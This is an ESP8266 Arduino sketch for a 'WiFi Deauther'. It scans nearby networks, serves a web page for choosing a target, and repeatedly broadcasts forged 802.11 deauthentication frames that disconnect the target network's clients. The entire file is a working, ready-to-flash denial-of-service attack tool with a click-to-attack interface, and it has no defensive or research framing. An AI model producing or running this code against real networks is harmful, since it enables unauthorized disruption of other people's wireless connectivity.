#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

extern "C" {
  #include "user_interface.h"
}

ESP8266WebServer server(80);

struct Target {
  uint8_t bssid[6];
  int channel;
  String ssid;
} target;

bool attacking = false;
unsigned long packetCount = 0;

void sendDeauth(uint8_t *bssid, uint8_t channel, uint8_t times) {
  wifi_set_channel(channel);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x02, 0x00
  };
  for (int i = 0; i < times; i++) {
    wifi_send_pkt_freedom(packet, 26, 0);
    delay(1);
  }
}

String htmlHeader() {
  return "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
         "<style>body{font-family:Arial;text-align:center;}button{padding:10px 20px;margin:5px;}</style></head><body>";
}

String htmlFooter() {
  return "</body></html>";
}

void handleRoot() {
  String html = htmlHeader();
  html += "<h1>ESP8266 WiFi Deauther</h1>";
  html += "<a href='/scan'><button>Scan Networks</button></a>";
  if (attacking) {
    html += "<p>Attacking: " + target.ssid + " | Packets sent: " + String(packetCount) + "</p>";
    html += "<a href='/stop'><button style='background:red;color:white;'>Stop Attack</button></a>";
  }
  html += htmlFooter();
  server.send(200, "text/html", html);
}

void handleScan() {
  int n = WiFi.scanNetworks();
  String html = htmlHeader();
  html += "<h2>Select Target</h2>";
  for (int i = 0; i < n; i++) {
    uint8_t* bssidPtr = WiFi.BSSID(i);
    char bssidStr[18];
    sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            bssidPtr[0], bssidPtr[1], bssidPtr[2],
            bssidPtr[3], bssidPtr[4], bssidPtr[5]);
    html += "<p>" + WiFi.SSID(i) + " (CH " + String(WiFi.channel(i)) + ") "
            "<a href='/attack?ch=" + String(WiFi.channel(i)) +
            "&bssid=" + String(bssidStr) +
            "&ssid=" + WiFi.SSID(i) + "'><button>Attack</button></a></p>";
  }
  html += htmlFooter();
  server.send(200, "text/html", html);
}

void handleAttack() {
  String bssidStr = server.arg("bssid");
  String ssidStr = server.arg("ssid");
  target.channel = server.arg("ch").toInt();
  target.ssid = ssidStr;

  sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &target.bssid[0], &target.bssid[1], &target.bssid[2],
         &target.bssid[3], &target.bssid[4], &target.bssid[5]);

  attacking = true;
  packetCount = 0;
  server.sendHeader("Location", "/");
  server.send(303);
}

void handleStop() {
  attacking = false;
  server.sendHeader("Location", "/");
  server.send(303);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ESP8266_Deauther", "12345678");
  wifi_promiscuous_enable(1);

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/stop", handleStop);

  server.begin();
  Serial.println("Web server started. Connect to 'ESP8266_Deauther' WiFi and visit http://192.168.4.1/");
}

void loop() {
  server.handleClient();

  if (attacking) {
    sendDeauth(target.bssid, target.channel, 10);
    packetCount += 10;
  }
}
